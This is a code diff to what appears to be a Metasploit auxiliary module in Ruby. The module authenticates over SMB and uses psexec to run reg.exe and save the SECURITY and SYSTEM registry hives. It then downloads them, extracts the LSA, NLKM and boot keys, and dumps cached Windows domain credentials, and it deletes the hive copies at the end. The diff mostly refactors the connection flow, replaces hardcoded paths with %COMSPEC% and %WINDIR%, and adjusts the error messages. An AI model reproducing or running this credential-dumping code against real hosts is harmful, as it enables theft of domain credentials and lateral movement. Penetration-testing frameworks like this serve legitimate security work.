@@ -72,24 +72,24 @@ class Metasploit3 < Msf::Auxiliary
 		smbshare = datastore['SMBSHARE']
 		logdir = datastore['LOGDIR']
 
-		connect()
-		#Try and authenticate with given credentials
-		begin
-			smb_login()
-		rescue StandardError => autherror
-			print_error("#{ip} - #{autherror}")
-			return
-		end
-
-		if save_reg_hives(smbshare, ip, secpath, syspath)
-			d = download_hives(smbshare, ip, syspath, secpath, logdir)
-			sys, sec = open_hives(logdir, ip)
-			if d
-				dump_cache_creds(sec, sys, ip, credentials)
+		if connect
+			#Try and authenticate with given credentials
+			begin
+				smb_login
+			rescue StandardError => autherror
+				print_error("#{ip} - #{autherror}")
+				return
 			end
+			if save_reg_hives(smbshare, ip, secpath, syspath)
+				d = download_hives(smbshare, ip, syspath, secpath, logdir)
+				sys, sec = open_hives(logdir, ip)
+				if d
+					dump_cache_creds(sec, sys, ip, credentials)
+				end
+			end
+			cleanup_after(smbshare, ip, secpath, syspath)
+			disconnect
 		end
-		cleanup_after(smbshare, ip, secpath, syspath)
-		disconnect()
 	end
 
 
@@ -101,7 +101,7 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			# Try to save the hive files
 			simple.connect(smbshare)
-			command = "C:\\WINDOWS\\SYSTEM32\\cmd.exe /C reg.exe save HKLM\\SECURITY C:\\WINDOWS\\Temp\\#{secpath} && reg.exe save HKLM\\SYSTEM C:\\WINDOWS\\Temp\\#{syspath}"
+			command = "%COMSPEC% /C reg.exe save HKLM\\SECURITY %WINDIR%\\Temp\\#{secpath} /y && reg.exe save HKLM\\SYSTEM %WINDIR%\\Temp\\#{syspath} /y"
 			psexec(smbshare, command)
 			return true
 		rescue StandardError => saveerror
@@ -169,7 +169,7 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			# Try and do cleanup
 			simple.connect(smbshare)
-			cleanup = "C:\\WINDOWS\\SYSTEM32\\cmd.exe /C del C:\\WINDOWS\\Temp\\#{secpath} C:\\WINDOWS\\Temp\\#{syspath}"
+			cleanup = "%COMSPEC% /C del /F /Q %WINDIR%\\Temp\\#{secpath} && del /F /Q %WINDIR%\\Temp\\#{syspath}"
 			psexec(smbshare, cleanup)
 		rescue StandardError => cleanerror
 			print_error("Unable to run cleanup, need to manually remove hive copies from windows temp directory.")
@@ -227,6 +227,9 @@ class Metasploit3 < Msf::Auxiliary
 			rescue StandardError => e
 				print_status("No cached hashes found on #{ip}")
 			end
+		else
+			print_error("#{ip} - Error obtaining LSA, NLKM, or Boot Key from SECURITY hive.")
+			return
 		end
 	end
 
@@ -238,7 +241,6 @@ class Metasploit3 < Msf::Auxiliary
 			decrypted = decrypt_secret( nlkm[0xC..-1], lsa_key )
 			return decrypted
 		rescue StandardError => nlkmerror
-			print_error("#{ip} - Error extracting NLKM value from SECURITY hive. #{nlkmerror}")
 			return nil
 		end
 	end
@@ -572,7 +574,6 @@ class Metasploit3 < Msf::Auxiliary
 			end
 			return lsa_key
 		rescue StandardError => lsaerror
-			print_error("#{ip} - Error getting LSA Key from SECURITY hive file. #{lsaerror}")
 			return nil
 		end
 	end
@@ -616,7 +617,6 @@ class Metasploit3 < Msf::Auxiliary
 			end
 			return scrambled
 		rescue StandardError => boot_key_error
-			print_error("#{ip} - Error extracting the boot key. #{boot_key_error}")
 			return nil
 		end
 	end
